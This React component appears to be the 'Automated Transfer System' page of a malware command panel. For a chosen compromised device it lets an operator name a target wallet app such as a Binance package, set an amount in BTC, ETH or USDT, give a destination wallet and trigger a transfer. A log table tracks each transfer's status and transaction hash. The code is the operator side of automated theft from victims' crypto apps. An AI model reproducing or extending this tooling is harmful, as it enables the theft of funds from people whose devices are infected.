import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { ats } from '../utils/api'
import { CreditCard, Send, Bitcoin } from 'lucide-react'

export default function AtsPage() {
  const { deviceId } = useParams()
  const [logs, setLogs] = useState([])
  const [form, setForm] = useState({ targetApp: '', amount: 0.5, currency: 'BTC', walletAddress: '' })

  useEffect(() => { if (deviceId) loadLogs() }, [deviceId])

  const loadLogs = async () => {
    const data = await ats.list(deviceId)
    if (data) setLogs(data)
  }

  const handleInitiate = async () => {
    await ats.initiate(deviceId, form)
    setForm({ targetApp: '', amount: 0.5, currency: 'BTC', walletAddress: '' })
    loadLogs()
  }

  const columns = [
    { key: 'target_app', label: 'Target App' },
    { key: 'amount', label: 'Amount', render: (row) => (
      <span className="font-mono text-wuzen-secondary">{row.amount} {row.currency}</span>
    )},
    { key: 'wallet_address', label: 'Wallet', render: (row) => (
      <span className="font-mono text-xs truncate max-w-[200px] block">{row.wallet_address}</span>
    )},
    { key: 'status', label: 'Status', render: (row) => (
      <span className={`text-xs px-2 py-0.5 rounded ${
        row.status === 'completed' ? 'bg-wuzen-success/10 text-wuzen-success' :
        row.status === 'pending' ? 'bg-wuzen-warning/10 text-wuzen-warning' :
        'bg-wuzen-danger/10 text-wuzen-danger'
      }`}>{row.status?.toUpperCase()}</span>
    )},
    { key: 'transaction_hash', label: 'TX Hash', render: (row) => (
      <span className="font-mono text-xs text-wuzen-muted">{row.transaction_hash || 'Pending...'}</span>
    )},
    { key: 'initiated_at', label: 'Time', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.initiated_at).toLocaleString()}</span>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Automated Transfer System" icon={CreditCard} onDeviceChange={() => {}} />

      <div className="wuzen-panel p-6 mb-6 max-w-2xl">
        <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Initiate Transfer</h3>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="text-xs text-wuzen-muted uppercase mb-1 block">Target App</label>
            <input className="wuzen-input w-full" value={form.targetApp} onChange={e => setForm(p => ({...p, targetApp: e.target.value}))} placeholder="com.binance.dev" />
          </div>
          <div>
            <label className="text-xs text-wuzen-muted uppercase mb-1 block">Amount</label>
            <input type="number" step="0.01" className="wuzen-input w-full" value={form.amount} onChange={e => setForm(p => ({...p, amount: parseFloat(e.target.value)}))} />
          </div>
          <div>
            <label className="text-xs text-wuzen-muted uppercase mb-1 block">Currency</label>
            <select className="wuzen-input w-full" value={form.currency} onChange={e => setForm(p => ({...p, currency: e.target.value}))}>
              <option value="BTC">BTC</option>
              <option value="ETH">ETH</option>
              <option value="USDT">USDT</option>
            </select>
          </div>
          <div>
            <label className="text-xs text-wuzen-muted uppercase mb-1 block">Wallet Address</label>
            <div className="relative">
              <Bitcoin className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-wuzen-muted" />
              <input className="wuzen-input w-full pl-10 font-mono text-xs" value={form.walletAddress} onChange={e => setForm(p => ({...p, walletAddress: e.target.value}))} placeholder="bc1q..." />
            </div>
          </div>
        </div>
        <button onClick={handleInitiate} className="wuzen-btn-danger mt-4">
          <Send className="w-4 h-4" /> INITIATE TRANSFER
        </button>
      </div>

      <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-3">Transfer History</h3>
      <DataTable columns={columns} data={logs} keyField="id" searchable />
    </div>
  )
}
